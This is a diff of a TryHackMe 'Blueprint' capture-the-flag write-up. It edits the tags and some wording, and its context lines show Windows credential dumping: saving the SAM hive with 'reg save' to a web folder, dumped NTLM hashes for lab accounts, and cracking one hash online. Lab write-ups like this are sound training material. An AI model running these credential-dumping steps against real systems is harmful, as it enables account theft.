@@ -1,9 +1,10 @@
 ---
 tags:
   - THM
-  - Windows
   - Easy
-  - RCE
+  - Windows
+  - CVE
+  - Cracking
 ---
 https://tryhackme.com/room/blueprint/
 # Add Hosts
@@ -128,7 +129,7 @@ Get the **administrator flag**:
 type C:\Users\Administrator\Desktop\root.txt.txt
 ```
 ## NTLM hash
-Now, we are asked for the *"Lab" user NTLM hash decrypted*. So, we get the SAM and SYSTEM files:
+Now, we are asked for the **decrypted NTLM hash** for `Lab` user. So, we get the SAM and SYSTEM files:
 ```console
 PS> reg save HKLM\SAM C:\xampp\htdocs\SAM
 
@@ -148,4 +149,4 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
 [*] Cleaning up...
 ```
-Using [CrackStation](https://crackstation.net/), cracked "Lab" user hash.
+Using [CrackStation](https://crackstation.net/), cracked the hash.
